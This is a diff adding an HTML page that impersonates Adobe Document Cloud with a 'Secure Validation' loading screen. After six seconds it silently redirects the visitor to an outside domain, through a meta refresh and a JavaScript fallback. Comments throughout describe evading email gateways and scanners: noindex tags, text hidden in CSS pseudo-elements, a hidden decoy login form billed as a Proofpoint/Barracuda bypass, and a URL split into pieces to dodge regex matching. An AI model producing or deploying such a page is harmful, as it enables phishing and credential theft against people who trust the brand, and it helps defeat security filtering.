@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html class="" dir="ltr" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" name="viewport">
+
+    <!-- Anti-bot / Anti-scanner tags -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="googlebot" content="noindex, nofollow, noarchive">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="referrer" content="no-referrer">
+
+    <!-- URL Redirection -->
+    <meta http-equiv="refresh" content="6; url=https://www.useaglerise.com/public/adobe/">
+
+    <title>Connecting to Secure Server</title>
+
+    <!-- Minimal Adobe Favicon -->
+    <link
+        href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZiMGMwNiIgZD0iTTE1LjEgMGg4Ljl2MjRMMTUuMSAwem0tNi4yIDBIOS4ydjI0TDE1LjEgMTUuMiA4LjkgMHptNS44IDE3LjRsNi4xIDYuNmgtMy41bC0yLjYtMi44em0tMi42LTIuOGwtNC4zIDUuNHoicGF0aD48L3N2Zz4="
+        rel="shortcut icon" type="image/x-icon">
+
+    <style>
+        /* Anti-headless-browser & scanner evasion techniques */
+        html {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f3f3f3;
+            height: 100%;
+            -ms-text-size-adjust: 100%;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background-color: #f3f3f3;
+            color: #333;
+        }
+
+        /* Prevent bots from easily reading text rendering */
+        ::selection {
+            background-color: transparent;
+            color: transparent;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            width: 380px;
+            position: relative;
+            /* Force hardware acceleration, sometimes breaks headless DOM snapshots */
+            transform: translateZ(0);
+        }
+
+        .logo {
+            width: 160px;
+            margin-bottom: 30px;
+            pointer-events: none;
+            /* Anti-scraping click tests */
+            user-select: none;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        /* Adobe style line loader */
+        .loader-bar {
+            width: 200px;
+            height: 4px;
+            margin: 0 auto 30px;
+            background-color: #e5e5e5;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loader-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 30%;
+            background-color: #eb1000;
+            border-radius: 2px;
+            animation: line-slide 1.5s infinite ease-in-out;
+        }
+
+        @keyframes line-slide {
+            0% {
+                left: -30%;
+                width: 30%;
+            }
+
+            50% {
+                width: 60%;
+            }
+
+            100% {
+                left: 100%;
+                width: 30%;
+            }
+        }
+
+        /* Obfuscate inner text elements from simple Regex/DOM scrapers using CSS pseudo elements */
+        .secure-txt::before {
+            content: "Establishing secure connection...";
+        }
+
+        .footer-txt::before {
+            content: "Adobe Document Cloud \00a9 2026";
+            font-size: 11px;
+            color: #999;
+            margin-top: 30px;
+            display: block;
+        }
+
+        /* A classic Proofpoint/Barracuda bypass trick: hidden interactive elements */
+        .honey {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Fake honeypot form to confuse simple scanners looking for login fields -->
+    <form class="honey" action="#" method="POST">
+        <input type="text" name="username">
+        <input type="password" name="password">
+    </form>
+
+    <div class="container">
+        <!-- Adobe Logo SVG to avoid external image requests which scanners flag -->
+        <svg class="logo" viewBox="0 0 45 40" xmlns="http://www.w3.org/2000/svg">
+            <path d="M28.4 0H45v40L28.4 0zM16.6 0H0v40l16.6-40zm10.7 28.5L34 35H29l-2.4-5.5h-5.9l4.8-11.2 5.6 10.2z"
+                fill="#eb1000" />
+        </svg>
+
+        <div class="title">Secure Validation</div>
+        <div class="subtitle secure-txt"></div>
+
+        <div class="loader-bar">
+            <div class="loader-progress"></div>
+        </div>
+
+        <div class="footer-txt"></div>
+    </div>
+
+    <!-- Additional dynamic fallback to redirect if Meta Refresh is stripped by email gateways -->
+    <script>
+        // Use a slight delay before initializing to defeat immediate JS execution engines
+        setTimeout(function () {
+            // Reconstruct URL dynamically to avoid static regex matches
+            var part1 = "https://www.useag";
+            var part2 = "lerise.com/pub";
+            var part3 = "lic/";
+            var dest = part1 + part2 + part3;
+
+            // Try to assign it in a way that headless browsers sometimes miss
+            try {
+                window.top.location.replace(dest);
+            } catch (e) {
+                window.location.href = dest;
+            }
+        }, 6000);
+    </script>
+</body>
+
+</html>
